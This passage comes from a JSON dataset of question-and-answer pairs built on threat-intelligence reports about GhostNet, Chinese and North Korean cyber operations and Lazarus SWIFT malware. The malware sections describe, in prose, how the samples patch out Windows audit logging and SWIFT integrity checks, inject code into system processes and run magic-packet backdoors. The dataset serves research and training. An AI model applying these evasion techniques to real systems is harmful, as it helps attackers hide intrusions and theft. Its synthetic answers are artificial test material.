compromised entity. Where possible, we note the entity identified by data obtained from the RiRs.\nThe following list of compromised computers was generated by parsing information from unique victims, not solely IP addresses. The attackers assign the compromised computer a name based on the host name of the computer, which allows us to identify unique victims rather than relying only on IP addresses. In fact, several of the unique victims have multiple IP addresses associated with them, sometimes spanning multiple countries. Here we have generated a geographic breakdown based on the first IP addresses recorded for each compromised computer.\nFigure 4:\nLocations of Compromised Computers in the Shadow Network\nWhile there is considerable geographic diversity, there is a high concentration of compromised computers  located in India. However, we were only able to identify two of the compromised entities:\n\u2462 Embassy of India, United States\n\u2462 Embassy of Pakistan, United States\nMedium Headline: 4.1.1 Sinkhole\nA DNS sinkhole server is a system that is designed to take requests from a botnet or infected systems and record the incoming information. The sinkhole server is not under the control of the malware authors and can be used to gain an understanding of a botnet's operation. There are a few different techiques that are used to sinkhole botnet traffic. The easiest method is to simply register an expired domain that was previously used to control victim systems. Being able to do this generally indicates the botnet operator has lost control of the domain, forgotten to renew it, or that the botnet has been abandoned. Another method focuses on reverse-engineering the malware to determine if it has \"fail over\" command and control servers or special methods to compute future domains. This may require that a domain name generation algorithm be discovered and that one must register the domain names before the attacker does (Stone-Gross et al. 2009).\nDuring the GhostNet investigation we found that a computer at the OHHDL was compromised by both the GhostNet and what we are now calling the Shadow network. We had a list of serveral domains that were expiring that we had linked to attacks against OHHDL. We were able to register several of these domain names in order to gather information about the network's command and control infrastructure, communication methods,\nand victim systems. We were able to register and monitor four of the domain names mentioned in Tracking GhostNet. In addition, we were able to register several others which we linked to the Shadow network along with one, www.assam2008.net, which we believe to be yet another separate, but possibly affiliated, network.\n\u2462 www.assam2008.net\n\u2462 www.msnxy.net\n\u2462 www.sysroots.net\n\u2462 www.womanld.com\n\u2462 www.womannana.com\n\u2462 www.lookbyturns.com\n\u2462 www.macfeeresponse.com\n\u2462 www.macfeeresponse.org\nWe were able to observe the file paths associated with malware that were requested by compromised computers. In total, we found that during this period 6,902 unique IPs requested paths associated with the malware that used these hosts as command and control servers. However, counting the number of infected hosts purely by IP addresses is problematic. In fact, botnets are generally much smaller than the total sum of unique IP  addresses would suggest (Stone-Gross et al. 2009; Rajab et al. 2007). This network, which is focused on stealing documents from specific targets, is expected to be small in size.\nQ: What methods were used to gather information about the Shadow network's command and control infrastructure, communication methods, and victim systems? Describe the techniques employed.",
    "output": "The investigators used several methods to gather information about the Shadow network's command and control infrastructure, communication methods, and victim systems. One method involved registering expired domains that were previously used to control victim systems, indicating that the botnet operator had lost control of the domain, forgotten to renew it, or that the botnet had been abandoned. Another method focused on reverse-engineering the malware to determine if it had 'fail over' command and control servers or special methods to compute future domains. This required discovering a domain name generation algorithm and registering the domain names before the attacker did. During the GhostNet investigation, they found that a computer at the Office of His Holiness the Dalai Lama (OHHDL) was compromised by both the GhostNet and the Shadow network. They registered several expiring domain names linked to attacks against OHHDL and monitored them to gather information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Context and background: Alleged Chinese operations in cyberspace\nChina has been developing its cyberspace doctrine and capabilities since the late 1990s as part of its military modernization programme. The Chinese doctrine of 'active defence,' which is the belief that China must be ready to respond to aggression immediately, places an emphasis on the development of cyber warfare capabilities.\nThe Chinese focus on cyber capabilities as part of its strategy of national asymmetric warfare involves deliberately developing capabilities that circumvent U.S. superiority in command-and-control warfare. The strategy recognizes the critical importance of the cyber domain to American military and economic power and the importance of offensive cyber operations to victory in a modern conflict with the United States. Chinese doctrine also emphasizes the contiguity between military and non-military realms.17\nIn recent years, there has been an increase in allegations that China-based hackers are responsible for high-level penetrations of computer systems in Europe, North America and Asia. Attackers originating in China have been accused of infiltrating government computers in the United States, Britain, France, Germany, South Korea, and Taiwan. China-based hackers have been accused of data theft from foreign government computers and commercial and financial institutions. The U.S. Department of Defense reports it is continuously targeted by Chinese attackers, most notably in the series of attacks since 2003 known as 'Titan Rain,' which targeted the Department of Defense and numerous defence companies.18\nThere are also allegations of attacks originating from China directed against non-governmental organizations active in regions where China has a national interest. This includes organizations advocating on the conflict in the Darfur region of Sudan,19 Tibetan groups active in India, and the Falun Gong. The majority of attacks involve website defacements, denial of service attacks, or virus writing campaigns. Nationalistic and patriotic cyber-activity by Chinese nationals intensifies during crises, such as during Sino-American or Sino-Taiwanese tensions (see below). To date none of these attacks have been traced back to Chinese state authorities or specific individuals, although many have benefited official Chinese policy and interests.\n17 http://findarticles.com/p/articles/mi_m0PBZ/is_6_88/ai_n31140190 ; http://www.infowar-monitor.net/modules.php?op=modload&na me=Archive&file=index&req=viewarticle&artid=2&page=1 ; http://www.heritage.org/Research/asiaandthepacific/upload/bg_2106.pdf\n18 http://www.time.com/time/magazine/article/0,9171,1098961,00.html ; http://findarticles.com/p/articles/mi_m0PBZ/is_6_88/ ai_n31140190 ; http://www.afa.org/media/reports/victorycyberspace.pdf\n19 http://www.insidetech.com/news/articles/1630-mysterious-forces-hack-pro-tibet-save-darfur-sites ; http://www.washingtonpost. com/wp-dyn/content/article/2008/03/20/AR2008032003193.html\nQ: How does the Chinese doctrine of 'active defense' influence its approach to cyber warfare, particularly in relation to the United States? Explain the strategic significance of this doctrine in the context of China's military modernization program.",
    "output": "The Chinese doctrine of 'active defense' emphasizes the need for immediate readiness to respond to aggression, which includes the development of cyber warfare capabilities. This doctrine is part of China's military modernization program and focuses on circumventing U.S. superiority in command-and-control warfare. The strategy recognizes the critical importance of the cyber domain to American military and economic power, and the necessity of offensive cyber operations to achieve victory in a modern conflict with the United States. Chinese doctrine also blurs the line between military and non-military realms, indicating a holistic approach to cyber warfare.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the internet era change the traditional 'fog of war' concept, and what new opportunities and challenges does it present for Information Warfare (IW)?",
    "output": "The internet era changes the traditional 'fog of war' by offering military and intelligence agencies new opportunities to expand and enhance Information Warfare (IW). This includes the ability to engage a worldwide audience that is both narrative-bearing and narrative-developing, making it more challenging for propagandists to predict how and where the narrative will evolve. However, it also provides defenders with more tools and tactics to counter hostile actions. The ubiquity and anonymity of internet communications offer nations like Russia new IW opportunities, while defenders can use accurate open source analysis to counter adversary operations, albeit with difficulty in a timely manner.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Working Hypotheses:\nThe use of Tranchulas and UmairAziz27 in the malware debugging paths, in addition to the multiple targeting campaigns that maintain themes likely aimed at Indian entities or involving Pakistan related issues, leads us to assess the following competing hypotheses which may be considered as plausible explanations for the identified activity:\nHypothesis 1: Tranchulas developed the malicious binaries, and staged them for offensive exploitation operations on behalf of an unidentified customer.\nHypothesis 2: Tranchulas developed and sold the malicious binaries to an unidentified customer, where they were later operationalized by an unidentified entity.\nHypothesis 3: An unidentified third party unaffiliated with Tranchulas developed the malware, deliberately including misleading software artifacts as a direct effort to create speculation and shift blame toward Tranchulas.\nHypothesis 4: A rogue Tranchulas employee used company resources without company knowledge to develop the malware, where an unknown operator later used it offensively.\nHypothesis 5: Indian entities actively sought and utilized the services of Pakistan based information security company, Tranchulas, for an officially sanctioned and authorized penetration test. The malicious implants were subsequently developed and used as part of official Tranchulas service offerings, while the files and infrastructure used for the audit were submitted to publicly available malware analysis services.\nHypothesis 6: An unidentified Indian entity developed and used this malware as a realistic simulated exercise to perform penetration testing and evaluate their readiness in the event of actual Pakistani affiliated offensive network operations. The files and infrastructure used for the simulation were submitted to publicly available malware analysis services.\nMedium Headline: Conclusion:\nConsidering the long-standing regional tensions between India and Pakistan, South Asia serves as a likely flashpoint for conventional conflict to carry over and play out within cyberspace. Public and private sectors alike should begin to increase their awareness of emerging cyber threats from the lesser-known middle powers. Regardless of sophistication, these threats may support future belligerents who have or will eventually possess the capability and intent to disrupt critical business operations.\nDetails associated with this threat have been shared with the ThreatConnect Community within Incident \"20130731A: South Asia Cyber Espionage Heats Up\". If you or your organization is interested in obtaining crowd-sourced threat intelligence that increases your awareness of emerging cyber threats, please register at ThreatConnect.com and join our community.\nTags: Cyber Espionage, India, Pakistan, South Asia, Telenor\nPrevious article\nNo Comments\nNext article\nSearch the Site...\nSUBSCRIBE TO OUR BLOG VIA\nRSS feed\nOR EMAIL\nEmail Address\nRecent Posts\nCyber Squared Launches ThreatConnect\u2122 API\nThreatConnect Gets to the Root of Targeted Exploitation Campaigns\nThreatConnect Takes Signature Management to the Next Level\nThe Dollars and \"Sense\" Behind Threat Intelligence Sharing\nDivide and Conquer: Unmasking China's 'Quarian' Campaigns Through Community\nAnswer this question: In the context of the Tranchulas APT report, how might the different hypotheses about the malware's origin impact the response strategies of targeted organizations? What preventive measures can be taken based on each hypothesis?",
    "output": "The different hypotheses about the malware's origin can significantly impact the response strategies of targeted organizations. For example, if Hypothesis 1 or 2 is true (Tranchulas developed the malware for a client or sold it), organizations might focus on identifying and mitigating vulnerabilities exploited by known Tranchulas techniques. If Hypothesis 3 is true (a third party included misleading artifacts), the focus would be on broader threat intelligence gathering to identify the real perpetrator. For Hypothesis 4 (a rogue employee), internal security measures and monitoring would be enhanced. If Hypothesis 5 or 6 is true (official penetration testing or simulation exercises), organizations would need to ensure that such activities are properly documented and controlled to prevent unintended exposure. Preventive measures include enhancing network monitoring, improving incident response plans, and increasing collaboration with threat intelligence communities to stay informed about emerging threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: fltmsg.exe <mode> <print file> <output-path>\nThe first parameter is a number 1 or 2. If any other value is passed to the executable it simply saves it to the log in the format of \"NR-PR-P %mode%\". We assume that \"NR-PR-P\" is interpreted by the attackers as \"nroff problem parameter\".\nMode 1 means that the module shall select the output path automatically, which contains the following string template: \"#%04d%04d.prt\", otherwise the output path is copied from the third command line argument.\nFor recognized modes 1 and 2 the module saves a backup for every \"print file\" passed to it via command line that has the extension \".prt\", \".out\" or \".txt\". The backups are stored in one of the following directories:\n\u25cf C:\\MSO10\\P %N%\\MOT\\\n\u25cf C:\\MSO10\\R %N%\\MOT\\\n\u25cf C:\\MSO10\\N %N%\\MOT\\\nWhere %N% is a sequential integer number.\nThe malware is an information harvester. It processes files passed to it, parses them and searches for specific SWIFT transaction codes, such as:\n\u25cf 28C: Statement Number\n\u25cf 25: Account Identification\nIts main purpose is to accumulate information about transactions passed through it, saving Sender and Receiver, Account and Statement Numbers as well as some other data included in parsed files. The files passed to it are allegedly in the SWIFT transaction format, which suggests that the attackers were closely accustomed to internal SWIFT documentation or carefully reverse engineered the format. It recognizes the following format tags:\n\u25cf 515 (M51)\n\u25cf 940 (M94) - start of day balance\n\u25cf 950 (M95) - end of day balance\nWhen such files are found, it logs them into the log folder drive:\\MSO10 and saves a copy. The RC4-encrypted file we found (LATIN.SHP) contained the following strings after decryption:\n\u25cf D:\\Alliance\\Entry\\database\\bin\\sqlplus.exe\n\u25cf D:\\Alliance\\Entry\\common\\bin\\win32\n\u25cf D:\\Alliance\\Entry\n\u25cf C:\\MSO10\\fltmsg.exe\n\u25cf C:\\MSO10\\MSO.DLL\n\u25cf C:\\MSO10\\MXS.DLL\n\u25cf \\\\127.0.0.1\\share\n\u25cf localhost\\testuser\n\u25cf \\\\127.0.0.1\\share\\\nIn the older case from Bangladesh the config contained SWIFT business identifier codes (BIC) to hide in SWIFT transaction statements.\nMedium Headline: Malware 2: SWIFT Alliance Access Protection Mangler\nMD5: 198760a270a19091582a5bd841fbaec0\nSize: 71'680 bytes\nDiscovered path: C:\\MSO10\\MSO.dll\nCompiled on: 2016.08.18 22:24:44 (GMT)\nLinker version: 10.0\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nInternal Bluenoroff module tag: PM\nUsed in: Incident #1\nThe compilation timestamp indicates the malware was compiled in the days preceding the attack on the bank.\nThis malware tool is used to patch some SWIFT Alliance software modules in the memory to disable certain protection mechanisms that were implemented to detect direct database manipulation attempts. The code was most likely created by the same developer that created SWIFT transactions Information Harvester (MD5: 0abdaebbdbd5e6507e6db15f628d6fd7). Like the information harvester it creates a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C:\\MSO10.\nIt also crafts several local filepaths, the purpose of which isn't clear. Not all have reference in the code and could be a copy-pasted code or part of common file in the framework:\n\u25cf %DRIVE%:\\MSO10\\LATIN.SHP\n\u25cf %DRIVE%:\\MSO10\\ENGDIC.LNG\n\u25cf %DRIVE%:\\MSO10\\ADDT.REF\n\u25cf %DRIVE%:\\MSO10\\MSE.LIV\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of 100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following message: \"PM-PR\". The file is read successfully if its size is larger or equal to a hardcoded value of 35,260. After that the module decrypts the file with an RC4 algorithm using a hardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.\nThe decrypted data from the file is validated by checking the magic header of the data, which should be 0xA0B0C0D0 value.\nThe file contains a configuration block of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks of 1096 bytes long. The number of blocks may vary, the module reads them all and stores them in a linked list structure.\nIf the LATIN.SHP file is found then the module simply counts the number of records in it and proceeds with patching the target file, which is described further. If it is not found or the file magic bytes differ from expected after decryption, then the patching does not happen and the code simply drops execution.\nThere is an internal logging feature implemented in the current module, which keeps text log in C:\\MSO10\\ENGDIC.LNG. The following log messages may appear in this file in plaintext:\nThe module has seven embedded blocks of 0x130 bytes long that contain patch target information.\nEach block seems to have four slots of 0x4C bytes with patch information. However, only the first slot per module is used at this point. Each slot contains information for just two code modifications.\nThe patch slots include the size of the patch, and the relative path to the module to be patched on disk, offset to the patched bytes (containing the relative virtual address) and original bytes. The patcher verifies that the original bytes are in place before modifying the code. The patch procedure can also do unpatching by design, however this feature is currently unused.\nThe first slot is a patch for the liboradb.dll library which seems to be essential and is applied in all cases. Other patches are designed for specific executables that the current SWIFT Alliance Software Patcher DLL module is loaded in. It searches for a corresponding patch that matches the current process executable filename and applies only that patch.\nThe following table contains an interpretation of the patch-blocks embedded into the binary. The table omits empty slots and shows only valid patch instructions:\nSWIFT Alliance software binary tools are linked with file \"saa_check.cpp\", which provides basic security checks and validates the integrity of the database. The patches are applied to the modules to disable these checks and prevent the detection of database inconsistency. The file selection is not random, as far as the SWIFT connected servers server environment is a complex of executable files with complicated relations, the attackers identified all executables that implemented new security features and patched them off. We have checked all other binaries on the analyzed servers and none of other applications were linked with saa_check.cpp, except those in the patchlist.\nThe patcher DLL has to be loaded into the address space of the target process to work. It is not designed to patch other processes.\nMedium Headline: Malware 3: SWIFT Alliance software Files Hook\nMD5: f5e0f57684e9da7ef96dd459b554fded\nSize: 91'136 bytes\nDiscovered path: C:\\MSO10\\MXS.dll\nCompiled on: 2016.08.18 22:24:31 (GMT)\nLinker version: 10.0\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nInternal Bluenoroff module tag: HD (alternative: HF)\nUsed in: Incident #1\nThe compilation timestamp indicates the malware was compiled during the days of the attack on the bank.\nIt is very similar to SWIFT transactions Information Harvester and SWIFT Alliance software Protection Mangler. Like the information harvester it creates a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C:\\MSO10.\nSimilarly, it crafts several local filepaths:\n\u25cf %DRIVE%:\\MSO10\\LATIN.SHP\n\u25cf %DRIVE%:\\MSO10\\ENGDIC.LNG\n\u25cf %DRIVE%:\\MSO10\\ADDT.REF\n\u25cf %DRIVE%:\\MSO10\\MSE.LIV\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of 100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following message: \"HD-PR\". The file is read successfully if its size is larger than or equal to a hardcoded value of 35,260. After that the module decrypts the file with an RC4 algorithm using the hardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.\nThe decrypted data from the file is validated by checking the magic header of the data, which should be 0xA0B0C0D0 value.\nThe file contains a configuration of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks 1096 bytes long. The number of blocks may vary, the module reads them all and stores them in a linked list structure.\nIf the LATIN.SHP file is found then the module simply counts the number of records in it and proceeds. If it is not found or the magic file bytes differ from expected after decryption, then the patching will not happen and the code simply drops execution.\nThere is an internal logging feature implemented in the current module, which keeps a text log in C:\\MSO10\\ENGDIC.LNG. The following log messages may appear in a file in plaintext:\nThe purpose of this module is in patching the current process, so that CopyFileA function in fact calls a custom hook function, which calls CreateProcessA and passes some arguments to it. The command line for the new process is as follows:\nSmall Headline: C:\\MSO10\\fltmsg.exe 2 \"%source_path%\" \"%destination_path%\"\nThe path to the fltmsg.exe process is taken from the decrypted configuration file C:\\MSO10\\LATIN.SHP.\nAnother API function, CreateProcessA is similarly hooked. Any call to create a new process, which starts one of two recognized executables \"nroff\" or \"printhelper\", is modified. Before the original executables are called, a custom application will be spawned with the following commandline:\nC:\\MSO10\\fltmsg.exe 0 %original arguments% - for nroff\nC:\\MSO10\\fltmsg.exe 1 %original arguments% - for printhelper\nIf the execution fails the module logs a failure message with a Win32 API error code.\nWe assume that this module is injected in the middle of running SWIFT Alliance software, to divert some of the interesting files for alteration or to make a reserve copy.\n\nAnswer this question based on the above context: How does the Lazarus Group's malware handle the decryption and validation of the LATIN.SHP configuration file, and what actions does it take based on the contents of this file?",
    "output": "The malware attempts to read the LATIN.SHP file from the 'C:\\\\MSO10' directory, making five attempts with an interval of 100ms. If the file is found and its size is at least 35,260 bytes, it is decrypted using an RC4 algorithm with a hardcoded key. The decrypted data is validated by checking for a magic header value of 0xA0B0C0D0. If valid, the file contains a configuration block and a sequence of data blocks, which are read and stored in a linked list structure. Based on the contents of this file, the malware proceeds with patching target files or dropping execution if the file is not found or invalid.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: The Unification Bureau falls under the Workers' Party. Its Operations Department is responsible for cyber-psychological warfare, organizational espionage, and oversight of Unit 204. Unit 204's responsibilities include planning and execution of cyber-psychological warfare operations and technological research. The Psychological Operations Department of the North Korea Defense Commission also engages in cyber-psychological warfare.\n129 maps.google.com\n130 Clarke, R. A. (2012). Cyber war: The next threat to national security and what to do about it. New York, NY: Ecco.\n131 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n132 http://goodfriendsusa.blogspot.co.uk/2008/07/north-korea-today-no174.html\n133 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n134 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\n135 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\nThe Liaison Department of the Worker's Party oversees a faction of ethnic North Koreans residing in Japan who are critical to North Korea's cyber and intelligence programs. This group, which was established in 1955, is referred to by various names including the Chosen Soren, Chongryon, and the General Association of Korean Residents in Japan.136 The Chongryon ascribe to juche and seek to preserve North Korean culture while living in Japan. They operate North Korean style schools and refuse to assimilate with Japanese culture.137 According to Mitsuhiro Suganuma, former section head of the second intelligence department of the Japanese Public Security Intelligence Agency (PSIA), \"Chongryon is virtually under the direct control of the Liaison Department of the Workers' Party of Korea, which has been in charge of North Korea's covert operations and underground activities against South Korea. Chongryon in Japan has been a strong support organization aimed at bringing a revolution in South Korea, or a red unification by force.\" He also stated \"North Korea will continue to make Chongryon serve as Pyongyang's pawn in covert operations against South Korea.\"138 The Chongryon are vital to North Korea's military budget, raising funds via weapons trafficking, drug trafficking, and other black market activities.139 The group also forms \"front companies\" abroad that benefit the regime by generating hard currency. One example is Unikotech, which was formed to sell KCC products abroad. 140 The Chongryon's underground group known as the Gakushu-gumi, or \"the study group\", gathers intelligence for North Korea and helps the regime procure advanced technologies.141 The Chongryon's role in North Korean intelligence and resource acquisition is discussed below in more detail.\n\"Chongryon is virtually under the direct control of the Liaison Department of the Workers' Party of Korea, which has been in charge of North Korea's covert operations and underground activities against South Korea.\"\nThe regime also has several government bodies under the Cabinet142 that oversee its infrastructure, intelligence, and technological development. These include the Central Scientific and Technological Information Agency (CSTIA), the Ministry of Electronics Industry, and the Ministry of Posts and Telecommunications. The CSTIA collects, analyzes, and processes data regarding advanced science and technology then sends relevant information to appropriate areas of the national economy. 143 The amount of information contained in CSTIA's technical database makes it North Korea's largest scientific facility. According to a CIA article, review of CSTIA's publications showed that China, Russia, and Japan are important sources of technical data. CSTIA's publications include newsletters and an 18-volume science and technology reference series.144 The Ministry of Posts and Telecommunications is the body of oversight for Star Joint Venture Co.145\n136 http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html\n137 http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html\n138 http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/\n139 http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf\n140 http://www.learningace.com/doc/2025666/863b663a9fb13b456304dd0a3bc43547/cyberwarfare\n141 http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf\n142 http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/\n143 https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html\n144 https://www.cia.gov/library/center-for-the-study-of-intelligence/kent-csi/vol48no1/pdf/v48i1a04p.pdf\n145 https://www.northkoreatech.org/tag/ministry-of-posts-and-telecommunications/\nAnswer this question: What is the role of the Chongryon in North Korea's cyber and intelligence programs, and how do they support the regime's covert operations?",
    "output": "The Chongryon, also known as the General Association of Korean Residents in Japan, is a group of ethnic North Koreans residing in Japan that is under the direct control of the Liaison Department of the Workers' Party of Korea. They are critical to North Korea's cyber and intelligence programs by operating North Korean-style schools, refusing to assimilate with Japanese culture, and engaging in various illegal activities such as weapons trafficking, drug trafficking, and other black market activities to raise funds for the regime. The Chongryon also form front companies abroad to generate hard currency and gather intelligence for North Korea through their underground group known as the Gakushu-gumi, or 'the study group.' Their activities are aimed at supporting North Korea's covert operations against South Korea and procuring advanced technologies for the regime.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Network-sniffer/patcher - atmdkdrv.sys\nCreates a \u0141le storage \"\\SystemRoot\\fonts\\vga\u0141xa1.fon\". Its \u0141rst word is set to 0x21 at the beginning of the DriverEntry function, and is replaced with 0x20 at the end of DriverEntry.\nThis driver appears to have been put together in \"quick-and-dirty hack\" style, using parts of the \"mstcp32.sys\" sniffer and other unknown drivers. It contains a lot of unused code which is partially broken or disabled. These include a broken \"Dynamically disable/enable windows audit logging\" subsystem and an incomplete \"Patcher mode\".\nThere are three algorithms used for strings encryption - RC5; alphabet encryption like the one used in \"mstcp32.sys\"; and XOR with a pre-seeded random number generator. Decrypted strings are immediately encrypted back until the next usage to avoid in-memory detection.\nThe driver's \u0141lename and device name differ across the samples. They depend on the name of the registry key that is used to start the driver.\nThe driver may operate in one of two independent modes - as a network sniffer or as a memory patcher. The mode of operation is selected on startup, based on the \"Con\u0141g2\" value of the driver's registry key. By default the driver starts in \"sniffer mode\".\nMedium Headline: Sniffer mode\nThe sniffer code is similar to the one used in the driver's \"tdip.sys\" and \"mstcp32.sys\" and uses NT4 NDIS-4, XP NDIS-5 interfaces, targeting incoming traf\u0141c on Ethernet and VPN (ndiswanip) interfaces. It captures only directed packets (containing a destination address equal to the station address of the NIC). Packers-\u0141ltering engine rules may be set via DeviceIoControl messages. Filtered packets are stored in-memory until requested. Maximum packets storage list length is 128 items per \u0141ltering rule.\nMedium Headline: Patcher mode\nAlmost broken, it does nothing interesting except, possibly, replace the thread's ServiceTable to an unchanged, clear copy taken from the on-disk image of \"ntoskrnl.exe\".\nSniffer only IOCTLs:\n44038004 - add \u0141ltering rule\n44038008 - clear stored packet in speci\u0141ed \u0141ltering rules list\n4403800C - enable speci\u0141ed \u0141ltering rule\n44038010 - disable speci\u0141ed \u0141ltering rule\n44038014 - get stored packet from speci\u0141ed \u0141ltering rules list\n44038018 - process packet like the one received from the wire (\u0141lter and store)\n4403801C - set maximum rules list length\n44038020 - get maximum rules list length\n80000004 - enablePacketsFiltering\n80000008 - disablePacketsFiltering (PauseSniffer)\n800024B4 - send packet to the speci\u0141ed network interface\nCommon IOCTLs:\n80000028 - do nothing (broken/unused part)\n80000038 - set external object (broken/unused part)\n8000003C - get 4 dwords struct (broken/unused part)\n80000040 - copy 260 bytes from the request (broken/unused part)\n80000320 - set I/O port mapping (broken/unused part)\n80000324 - clear I/O port mapping (broken/unused part)\n80000328 - set external PnP Event (broken/unused part)\n80000640 - replace speci\u0141ed thread's SDT (ETHREAD.ServiceTable \u0141eld) to a given copy\nBig Headline: Backdoor driven by network sniffer - \"mstcp32.sys\", \"fat32.sys\"\nThis is a sniffer tool similar to \"tdip.sys\" and it uses NT4 NDIS-4, XP NDIS-5 interfaces.  It targets incoming traf\u0141c on Ethernet and VPN (ndiswanip) interfaces, but instead of dumb packet dumping, it uses received packets as commands for the \"process injector\" subsystem that is able to extract and execute code from the specially crafted network packets.\nDefault \u0141ltering rules are stored in the \"Options\" registry value of the driver's registry key. It captures only directed packets (containing a destination address equal to the station address of the NIC).\nThe driver's \u0141lename and device name differ across the samples. They depend on the name of the registry key that is used to start the driver.\nMedium Headline: Code Patcher\nThe driver patches OS code to dynamically disable or enable Windows audit logging.\nIt patches the function \"LsapAdtWriteLog\" in \"lsasrv.dll\" module of the \"lsass.exe\" process.\nIt searches for pre-de\u0141ned signatures of the function \"LsapAdtWriteLog\" of known Windows versions -4.0, 5.0, 5.1, 5.2 (NT4, Win2000, XP, WinSrv2003).\nThen it selects a corresponding offset to replace the opcodes:\n'jz' to never taken 'jo' in case of XP\njmp over inner logic to procedure epilog in case of Windows Server 2003 so LsapAdtWriteLog skips logging of audit records\nThe module also patches \"SepAdtLogAuditRecord\" inside \"ntoskrnl.exe\" to \"retn 4\" instead of the \u0141rst opcode of the function.\nThe disabled audit can be restored after a timeout or on-event by a dedicated thread.\nExpected IOCTL codes:\n80000004 - setFilteringRules\n80000008 - disablePacketsFiltering (PauseSniffer)\n80000028 - do nothing (possible broken GetDriverName)\n80000038 - disable_audit\n8000003C - enable_audit\nMedium Headline: Code Injector\nThe code-builder within this module facilitates exploitation by providing up to four prede\u0141ned execution templates, which seem to be suitable for generating several code patterns.\nBelow is a list of the execution templates we found:\nlocate a DLL via PEB structure and resolve exports\ncall single function\ncall four functions\ncall six functions\nUsing these as a base for the templates, the code-builder inserts parameters and proper offsets to call one of the following code patterns:\nLocate and call WinExec\nLocate and call LoadLibraryW, GetProcAddress, call exported procedure, FreeLibrary\nLocate and call LoadLibraryW, GetProcAddress, call GetModuleHandle, FreeLibrary\nLocate and call OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, VirtualFreeEx, CloseHandle\nThe code injection procedure allocates memory via ZwAllocateVirtualMemory in services.exe and copies implanted code. After that it uses KeInsertQueueApc to let the code run and waits 30 seconds for APC to complete.\nWhen the module starts, it reads registry value [HKLM\\System\\CurrentControlSet\\Services\\%driver name%] Processes. This value may contain a list of process names that should be started by injected executable code but only after services.exe and winlogon.exe has been started. The injection of code into winlogon.exe and services.exe ensures that the newly started process will have SYSTEM user privileges. During the injection stage Windows Audit Logging is fully disabled to avoid leaving any suspicious records in Windows Logs.\nMedium Headline: Magic Packet Recognition\nAll incoming packets are \u0141rst \u0141ltered by BPF-like rules. The \u0141ltering rules are located in [HKLM\\System \\CurrentControlSet\\Services\\%driver name%] Options registry value or passed via corresponding IOCTL. Packets that passed through the \u0141lter are added in the end of processing queue.\nPackets from the queue must have valid checksum values. After checking that, the code XOR-decrypts additional data from the end of the packet. The decrypted end of the packet contains another control structure that de\u0141nes which encryption algorithm is used to decipher packet body. Supported algorithms include RC5 and RSA. There is a 1024-bits RSA public key hardcoded inside the module body, while a 96-bits RC5 key is generated dynamically.\nThe backdoor command may arrive in a single packet or be split into pieces and come with several packets. There is a procedure for re-assembling pieces together: a multi-packet command is added to a special packet collector which puts all the pieces together before passing it further.\nBackdoor command is stored in the \u0141rst byte of the decrypted request and can be one of the following values:\nNote: \"mstcp32\" is mentioned together with rootkit-like behavior in 2004 here: http://www.pcreview.co.uk /forums/mstcp32-t1445152.html[21]\nBig Headline: Network Sniffer - tdip.sys\nSupports the following versions of Windows: NT4 using NDIS-4 and XP using NDIS-5. Doesn't use Vista and later NDIS-6 features. However, later NDIS versions are backward-compatible, so the driver is still valid for current versions of Windows.\nVersion Info:\nFileDescription: IP Transport Driver\nLegalCopyright: \u00a9 Microsoft Corporation. All rights reserved.\nFileVersion: 5.1.2600.2180\nInternalName: tdip.sys\nThis driver is a packet sniffer for incoming-only traf\u0141c on Ethernet and VPN (ndiswanip) interfaces or any used with ms_pschedmp as an alternative connection.\nIt implements a BPF (Berkeley packet \u0141lter) style packet-\u0141ltering system that is con\u0141gured from the driver's registry con\u0141guration values or from DeviceIoControl messages.\nThe captured network packets may be written to disk in libpcap format (magic 0xA1B2C3D4 version 2.4) and encrypted with one-byte XOR, key 0xE3.\nThe driver's con\u0141guration is stored in the registry key:\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\tdip]\nOptions - packet \u0141ltering rules in BPF format\nTag - selector of \u0141ltered packet types / Defaults in case of MediumWan to\nNDIS_PACKET_TYPE_BROADCAST|NDIS_PACKET_TYPE_MULTICAST|NDIS_PACKET_TYPE_DIRECTED; (or NDIS_PACKET_TYPE_BROADCAST|NDIS_PACKET_TYPE_DIRECTED in any other case)\nImageFile - full path name to the resulting pcap \u0141le\nDuration - used as Length of the original packet in dump \u0141le. (default 0xffff)\nBackup - max size of the pcap \u0141le\nIOCTLs:\n0x80002004 